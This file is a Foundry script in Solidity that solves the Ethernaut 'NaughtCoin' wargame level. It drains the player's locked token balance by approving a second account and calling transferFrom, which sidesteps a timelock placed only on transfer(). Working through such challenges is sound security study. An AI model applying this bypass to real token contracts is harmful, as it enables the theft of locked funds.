pragma solidity ^0.8.0;

import "Ethernaut/naughtcoin.sol";
import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
contract NaughtCoinPocScript is Script {
    NaughtCoin naughtCoin;
    constructor() {
        naughtCoin = NaughtCoin(0xfe3fef1A706eeE078C9Af13EDe392BfE707099Fc);
    }

    function run() public {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        uint256 amount = naughtCoin.balanceOf(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B);
        naughtCoin.approve(0x98eE9b8334149aDC8688A422e49397a2607a4329, amount);

        // console.log(naughtCoin.allowance(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B, 0x98eE9b8334149aDC8688A422e49397a2607a4329));

        vm.stopBroadcast();

        deployerKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(deployerKey);
        naughtCoin.transferFrom(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B, 0x98eE9b8334149aDC8688A422e49397a2607a4329, amount);
        vm.stopBroadcast();
    }
}